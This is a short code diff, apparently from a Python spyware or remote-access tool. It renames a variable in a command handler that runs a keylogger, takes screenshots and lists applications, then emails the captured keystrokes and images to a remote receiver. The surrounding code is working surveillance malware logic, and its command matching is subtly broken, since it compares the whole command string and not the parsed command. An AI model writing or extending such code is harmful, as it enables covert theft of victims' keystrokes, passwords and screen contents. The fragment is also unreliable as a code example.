@@ -53,7 +53,7 @@ def send_email(sender, receiver, subject, body, image_data=None):
 def CheckAndDo(cmd):
     parts = cmd.split(' ')
     command = parts[0]
-    argument = int(parts[1])
+    duration = int(parts[1])
     if (cmd == 'applications'):
         print("Applications")
         send_email(username_checker, username_receiver,
@@ -68,7 +68,7 @@ def CheckAndDo(cmd):
     elif (cmd == 'keylogger'):
         print("Keylogger")
         send_email(username_checker, username_receiver,
-                   "Keys pressed:", key_logger(argument))
+                   "Keys pressed:", key_logger(duration))
     elif (cmd == 'screenshot'):
         print("Screenshot")
         image_data = screenshot.screen_shot()
